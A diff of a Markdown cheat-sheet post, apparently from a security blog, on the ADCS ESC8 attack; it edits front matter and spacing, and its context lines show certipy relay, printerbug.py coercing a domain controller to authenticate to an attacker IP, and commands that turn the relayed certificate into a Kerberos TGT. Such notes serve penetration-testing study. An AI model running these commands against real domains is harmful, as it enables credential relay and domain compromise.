@@ -1,16 +1,23 @@
 ---
-title: "ADCS : ESC8"
+title: 'ADCS : ESC8'
 date: 2025-11-30 15:49:27
+
 categories:
   - Active Directory
   - Windows
   - Exploitation
   - ADCS
+
 tags:
-  - Certipy
   - ESC8
+  - Certipy
   - impacket-ntlmrelayx
   - printerbug
+
+
+cover: /img/esc8.png
+top_img: /img/bg-img.jpg
+description: Exploit ADCS ESC8.
 ---
 
 ### Enumeration
@@ -49,21 +56,24 @@ certipy relay -target 'http://<DC-Name.domain>/' -template <CERT-TEMPLATE>
 
 ### Force Machine Authentication
 
+
 ```bash
 python3 printerbug.py <DOMAIN>/<USERNAME>:<PASSWORD>@<DC-IP> <ATTACKER-IP>
 ```
 
-### Request TGT
+
+### Request TGT 
 
 ```bash
 python3 gettgtpkinit.py -cert-pfx <PATH-TO-PFX> -dc-ip <DC-IP> '<DOMAIN>/<MACHINE-ACCOUNT>$' <OUTPUT-CCACHE>
 ```
 
-Or
+Or 
 
 ```bash
-certipy auth -pfx <OUTPUT-CCACHE> -dc-ip <DC-IP>
+certipy auth -pfx <OUTPUT-CCACHE> -dc-ip <DC-IP> 
 ```
+
 
 ### Set Kerberos Cache to Use the TGT
 
